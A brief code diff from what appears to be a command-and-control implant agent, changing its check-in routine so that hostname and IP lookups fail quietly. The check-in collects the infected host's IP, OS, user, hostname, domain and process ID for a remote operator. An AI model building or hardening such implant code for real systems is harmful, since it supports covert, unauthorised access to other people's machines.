@@ -110,12 +110,20 @@ CRYPTO_HERE
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
     def checkIn(self):
+        hostname = socket.gethostname()
+        ip = ''
+        if hostname and len(hostname) > 0:
+            try:
+                ip = socket.gethostbyname(hostname)
+            except:
+                pass
+
         data = {
             "action": "checkin",
-            "ip": socket.gethostbyname(socket.gethostname()),
+            "ip": ip,
             "os": self.getOSVersion(),
             "user": self.getUsername(),
-            "host": socket.gethostname(),
+            "host": hostname,
             "domain:": socket.getfqdn(),
             "pid": os.getpid(),
             "uuid": self.agent_config["PayloadUUID"],
